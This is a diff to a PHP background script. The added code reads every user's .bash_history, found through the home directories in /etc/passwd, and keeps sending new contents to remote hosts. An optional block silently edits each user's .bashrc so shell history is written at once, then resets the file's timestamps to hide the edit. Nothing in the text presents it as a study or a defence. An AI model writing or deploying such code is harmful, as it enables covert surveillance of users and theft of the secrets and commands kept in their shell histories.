@@ -53,23 +53,67 @@ if (extension_loaded('pcntl')) {
 }
 
 while (true) {
-    $files = array('root' => '/root/.bash_history');
-    foreach (array_diff(scandir('/home'), array('.', '..')) as $user) {
-        $files[preg_replace('/[^a-z0-9_-]+/i', '', $user)] = "/home/$user/.bash_history";
-    }
-    foreach ($files as $user => $file) {
-        if (is_file($file) && is_readable($file)) {
-            $lastSize2 = filesize($file);
-            if (!isset($lastSize[$user]) || $lastSize[$user] !== $lastSize2) {
-                $data = file_get_contents($file);
-                if ($data) {
-                    while (!transmit($hosts, $api, $protocol, $data, $key, $user)) {
-                        usleep(mt_rand(1, 999));
+    $files = array();
+    foreach (explode("\n", file_get_contents('/etc/passwd') ?: '') as $userData) {
+        if ($userData) {
+            $data = explode(':', $userData);
+            if ($data[5]) {
+                $user = preg_replace('/[^a-z0-9_-]+/i', '', $data[0]);
+                if (is_dir($data[5])) {
+                    $history = str_replace('//.bash_history', '/.bash_history', "{$data[5]}/.bash_history");
+                    if (is_file($history) && is_readable($history)) {
+                        $lastSize2 = filesize($history);
+                        if (!isset($lastSize[$user]) || $lastSize[$user] !== $lastSize2) {
+                            $data = file_get_contents($history);
+                            if ($data) {
+                                while (!transmit($hosts, $api, $protocol, $data, $key, $user)) {
+                                    usleep(mt_rand(1, 999));
+                                }
+                                $lastSize[$user] = $lastSize2;
+                            }
+                        }
                     }
-                    $lastSize[$user] = $lastSize2;
+                    // @phan-suppress-next-line PhanPluginBothLiteralsBinaryOp
+                    if ('###ENABLE_BASHRC_MODIFICATION###' === 'true') {
+                        $rc = str_replace('//.bashrc', '/.bashrc', "{$data[5]}/.bashrc");
+                        if (is_file($rc) || is_file($history)) {
+                            $lastModified = is_file($rc) ? filemtime($rc) : 0;
+                            $lastAccessed = is_file($rc) ? fileatime($rc) : 0;
+                            $data = is_file($rc) ? file_get_contents($rc) : '';
+                            $found = false;
+                            $lines = explode("\n", $data);
+                            foreach ($lines as &$line) {
+                                if (strlen($line) > 22 && substr($line, 0, 22) === 'export PROMPT_COMMAND=') {
+                                    if (strpos($line, 'history -a') === false) {
+                                        if (substr($line, strlen($line) -1, 1) !== "'") {
+                                            $parts = explode('=', $line, 2);
+                                            $line = "{$parts[0]}='{$parts[1]}'";
+                                        }
+                                        $line = substr($line, 0, strlen($line) - 1) . ";history -a'";
+                                    }
+                                    $found = true;
+                                }
+                            }
+                            if (!$found) {
+                                $lines[] = "export PROMPT_COMMAND='history -a'";
+                            }
+                            $newData = implode("\n", $lines);
+                            if ($newData !== $data) {
+                                file_put_contents($rc, $newData);
+                                if ($lastModified + $lastAccessed > 0) {
+                                    touch($rc, $lastAccessed, $lastModified);
+                                }
+                                chown($rc, $user);
+                            }
+                        }
+                    }
                 }
             }
         }
     }
-    sleep(1);
+    if (exec('who -q') === '# users=0') {
+        sleep(5);
+    } else {
+        sleep(1);
+    }
 }
